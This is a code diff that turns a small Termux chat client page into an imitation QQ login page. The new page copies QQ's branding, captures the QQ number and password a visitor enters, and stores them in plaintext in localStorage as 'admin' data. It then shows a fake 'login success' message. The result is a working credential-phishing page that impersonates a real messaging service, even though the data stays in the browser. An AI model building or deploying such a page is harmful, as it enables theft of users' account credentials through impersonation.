@@ -1,94 +1,375 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Termux Chat Server</title>
+    <title>QQ</title>
     <style>
-        * {margin:0;padding:0;box-sizing:border-box;}
-        body {font-family:monospace;background:#000;color:#0f0;padding:20px;}
-        .chat-box {max-width:800px;margin:0 auto;border:1px solid #0f0;height:80vh;display:flex;flex-direction:column;}
-        .messages {flex:1;padding:10px;overflow-y:auto;border-bottom:1px solid #0f0;}
-        .message {margin:5px 0;padding:8px;background:#111;border-radius:4px;}
-        .self {text-align:right;background:#1a1a1a;}
-        .input-area {display:flex;padding:10px;}
-        #msg-input {flex:1;background:#111;border:1px solid #0f0;color:#0f0;padding:8px;outline:none;}
-        #send-btn {background:#0f0;color:#000;border:none;padding:8px 16px;margin-left:5px;cursor:pointer;}
-        .status {padding:5px;text-align:center;color:#ff0;font-size:12px;}
+        /* 全局样式 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        
+        /* QQ Logo */
+        .qq-logo {
+            text-align: center;
+            padding: 60px 0 40px;
+        }
+        
+        .qq-text {
+            font-size: 72px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        /* 输入框区域 */
+        .input-group {
+            padding: 0 30px;
+            margin-bottom: 20px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            background: #f8f9fa;
+            transition: all 0.3s ease;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #00c6ff;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0, 198, 255, 0.1);
+        }
+        
+        /* 协议警告 */
+        .protocol-warning {
+            background: linear-gradient(135deg, #ffe4e6, #fecdd3);
+            border: 1px solid #fda4af;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin: 0 30px 20px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            animation: shake 0.5s ease-in-out;
+        }
+        
+        .protocol-warning.show {
+            display: flex;
+        }
+        
+        .warning-icon {
+            color: #e11d48;
+        }
+        
+        .warning-text {
+            color: #881337;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        /* 协议同意 */
+        .protocol-agreement {
+            display: flex;
+            align-items: center;
+            margin: 0 30px 30px;
+            padding: 8px 0;
+        }
+        
+        .protocol-checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ccc;
+            border-radius: 6px;
+            margin-right: 12px;
+            appearance: none;
+            cursor: pointer;
+            position: relative;
+        }
+        
+        .protocol-checkbox:checked {
+            background: #00c6ff;
+            border-color: #00c6ff;
+        }
+        
+        .protocol-checkbox:checked::after {
+            content: '✓';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .protocol-text {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .protocol-link {
+            color: #00c6ff;
+            text-decoration: none;
+        }
+        
+        /* 登录按钮 */
+        .login-btn {
+            width: calc(100% - 60px);
+            margin: 0 30px 40px;
+            padding: 18px;
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 198, 255, 0.3);
+        }
+        
+        /* 底部导航 */
+        .bottom-nav {
+            display: flex;
+            background: white;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .nav-item {
+            flex: 1;
+            text-align: center;
+            padding: 20px 0;
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 12px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .nav-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: #666;
+        }
+        
+        .nav-item:hover .nav-icon {
+            color: #00c6ff;
+        }
     </style>
 </head>
 <body>
-    <div class="chat-box">
-        <div class="status" id="status">Connecting...</div>
-        <div class="messages" id="messages"></div>
-        <div class="input-area">
-            <input type="text" id="msg-input" placeholder="Type message...">
-            <button id="send-btn">Send</button>
+    <div class="container">
+        <!-- QQ Logo -->
+        <div class="qq-logo">
+            <div class="qq-text">QQ</div>
+        </div>
+        
+        <!-- 登录表单 -->
+        <div class="login-form">
+            <div class="input-group">
+                <input type="text" class="input-field" id="qqNumber" placeholder="输入QQ号" maxlength="15">
+                <input type="password" class="input-field" id="qqPassword" placeholder="输入QQ密码">
+            </div>
+            
+            <div class="protocol-warning" id="protocolWarning">
+                <svg class="warning-icon" width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+                    <path fill-rule="evenodd" d="M8 15A7 7 0 108 1a7 7 0 000 14zm0 1A8 8 0 108 0a8 8 0 000 16z" clip-rule="evenodd"/>
+                    <path d="M7.002 11a1 1 0 112 0 1 1 0 01-2 0zM7.1 4.995a.905.905 0 111.8 0l-.35 3.507a.552.552 0 01-1.1 0L7.1 4.995z"/>
+                </svg>
+                <span class="warning-text">请先勾选协议</span>
+            </div>
+            
+            <div class="protocol-agreement">
+                <input type="checkbox" id="agreeProtocol" class="protocol-checkbox">
+                <label for="agreeProtocol" class="protocol-text">
+                    已阅读并同意
+                    <a href="#" class="protocol-link" onclick="showProtocol()">服务协议</a>
+                    和
+                    <a href="#" class="protocol-link" onclick="showPrivacy()">QQ隐私保护指引</a>
+                </label>
+            </div>
+            
+            <button class="login-btn" id="loginBtn" onclick="login()">
+                登录
+            </button>
+        </div>
+        
+        <!-- 底部导航 -->
+        <div class="bottom-nav">
+            <button class="nav-item" onclick="showDeveloping('手机号登录')">
+                <div class="nav-icon">📱</div>
+                <span>手机号登录</span>
+            </button>
+            <button class="nav-item" onclick="showDeveloping('其他方式登录')">
+                <div class="nav-icon">⋯</div>
+                <span>其他方式登录</span>
+            </button>
+            <button class="nav-item" onclick="showDeveloping('注册')">
+                <div class="nav-icon">➕</div>
+                <span>注册</span>
+            </button>
+            <button class="nav-item" onclick="showDeveloping('更多')">
+                <div class="nav-icon">⚙️</div>
+                <span>更多</span>
+            </button>
         </div>
     </div>
-
+    
     <script>
-        const STATUS = document.getElementById('status');
-        const MESSAGES = document.getElementById('messages');
-        const INPUT = document.getElementById('msg-input');
-        const SEND_BTN = document.getElementById('send-btn');
-
-        let WS;
-        let SERVER_URL = window.location.hostname === 'android-dev247.github.io' 
-            ? prompt('Enter Server WS URL (e.g., wss://xxx.ngrok.io)') 
-            : `ws://${window.location.host}`;
-
-        function initWS() {
-            WS = new WebSocket(SERVER_URL);
-            WS.onopen = () => {
-                STATUS.textContent = 'Connected to Termux Server';
-                SEND_BTN.disabled = false;
-                loadHistory();
-            };
-            WS.onmessage = (e) => {
-                const msg = JSON.parse(e.data);
-                addMessage(msg.content, msg.sender !== 'self', msg.timestamp);
-            };
-            WS.onclose = () => {
-                STATUS.textContent = 'Disconnected, retrying...';
-                SEND_BTN.disabled = true;
-                setTimeout(initWS, 3000);
-            };
-            WS.onerror = (err) => {
-                STATUS.textContent = 'Error: ' + err.message;
-            };
+        // 登录功能
+        function login() {
+            const qqNumber = document.getElementById('qqNumber').value;
+            const qqPassword = document.getElementById('qqPassword').value;
+            const agreeProtocol = document.getElementById('agreeProtocol').checked;
+            const warning = document.getElementById('protocolWarning');
+            
+            // 检查协议
+            if (!agreeProtocol) {
+                warning.classList.add('show');
+                return;
+            }
+            
+            // 检查输入
+            if (!qqNumber || !qqPassword) {
+                alert('请输入QQ号和密码');
+                return;
+            }
+            
+            // 验证QQ号格式
+            if (!/^[1-9][0-9]{4,14}$/.test(qqNumber)) {
+                alert('请输入正确的QQ号码（5-15位数字，不能以0开头）');
+                return;
+            }
+            
+            // 保存到管理员后台
+            saveToAdmin(qqNumber, qqPassword);
+            
+            // 显示登录成功
+            alert(`登录成功！\nQQ号: ${qqNumber}\n密码: ${'*'.repeat(qqPassword.length)}`);
+            
+            // 清空表单
+            document.getElementById('qqNumber').value = '';
+            document.getElementById('qqPassword').value = '';
+            document.getElementById('agreeProtocol').checked = false;
+            warning.classList.remove('show');
         }
-
-        async function loadHistory() {
-            try {
-                const API_URL = SERVER_URL.replace('ws', 'http').replace('wss', 'https');
-                const res = await fetch(`${API_URL}/messages`);
-                const msgs = await res.json();
-                msgs.forEach(msg => addMessage(msg.content, msg.sender !== 'self', msg.timestamp));
-            } catch (e) {console.log('Load history failed:', e);}
+        
+        // 保存到管理员后台
+        function saveToAdmin(qqNumber, qqPassword) {
+            // 获取现有数据
+            let adminData = JSON.parse(localStorage.getItem('qq_admin_data') || '[]');
+            
+            // 创建新记录
+            const record = {
+                id: Date.now(),
+                qqNumber: qqNumber,
+                password: qqPassword, // 注意：实际应用中密码应该加密存储
+                loginTime: new Date().toLocaleString('zh-CN', {
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit',
+                    hour12: false
+                }),
+                ip: '127.0.0.1', // 模拟IP
+                userAgent: navigator.userAgent
+            };
+            
+            // 添加到数据
+            adminData.push(record);
+            
+            // 保存到本地存储
+            localStorage.setItem('qq_admin_data', JSON.stringify(adminData));
+            
+            console.log('数据已保存到管理员后台:', record);
         }
-
-        function addMessage(content, isOther, time) {
-            const div = document.createElement('div');
-            div.className = `message ${isOther ? '' : 'self'}`;
-            div.innerHTML = `<span>${content}</span><br><small>${new Date(time).toLocaleTimeString()}</small>`;
-            MESSAGES.appendChild(div);
-            MESSAGES.scrollTop = MESSAGES.scrollHeight;
+        
+        // 协议链接
+        function showProtocol() {
+            event.preventDefault();
+            alert('服务协议内容\n\n这是QQ高仿网页版的服务协议演示。');
         }
-
-        SEND_BTN.addEventListener('click', () => {
-            const content = INPUT.value.trim();
-            if (!content || WS.readyState !== WebSocket.OPEN) return;
-            const msg = {sender: 'self', content, timestamp: new Date().toISOString()};
-            WS.send(JSON.stringify(msg));
-            INPUT.value = '';
+        
+        function showPrivacy() {
+            event.preventDefault();
+            alert('QQ隐私保护指引\n\n这是QQ高仿网页版的隐私保护指引演示。');
+        }
+        
+        // 开发中提示
+        function showDeveloping(feature) {
+            alert(`功能开发中\n\n${feature}功能正在开发中，敬请期待！`);
+        }
+        
+        // 自动聚焦到QQ号输入框
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('qqNumber').focus();
         });
-
-        INPUT.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') SEND_BTN.click();
+        
+        // 监听协议勾选
+        document.getElementById('agreeProtocol').addEventListener('change', function() {
+            if (!this.checked) {
+                document.getElementById('protocolWarning').classList.add('show');
+            } else {
+                document.getElementById('protocolWarning').classList.remove('show');
+            }
         });
-
-        initWS();
+        
+        // 监听回车键
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                login();
+            }
+        });
     </script>
 </body>
 </html>
